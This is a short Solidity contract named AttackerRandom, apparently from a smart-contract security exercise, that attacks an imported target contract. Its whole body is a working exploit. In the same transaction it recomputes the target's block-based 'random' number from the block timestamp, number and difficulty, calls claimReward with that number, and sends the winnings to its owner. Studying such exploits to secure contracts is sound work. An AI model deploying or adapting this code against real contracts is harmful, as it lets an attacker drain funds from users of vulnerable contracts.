//SPDX-License-Identifier:UNLICENSED

pragma solidity ^0.8.19;

import "./ToAttackRandom.sol";

contract AttackerRandom {

    ToAttackRandom toAttack;
    address owner;

    modifier onlyOwner(){
        require(msg.sender == owner, "Caller is not the owner");
        _;
    }


    constructor(address payable _toAttackAddress){
        toAttack = ToAttackRandom(_toAttackAddress);
        owner = msg.sender;
    }



    function getNumberAndCall()public onlyOwner{
        uint rightNumber = uint(keccak256(abi.encodePacked(block.timestamp, block.number, block.difficulty)));
        toAttack.claimReward(rightNumber);
        payable(owner).transfer(address(this).balance);
    }



    receive()external payable{}
}
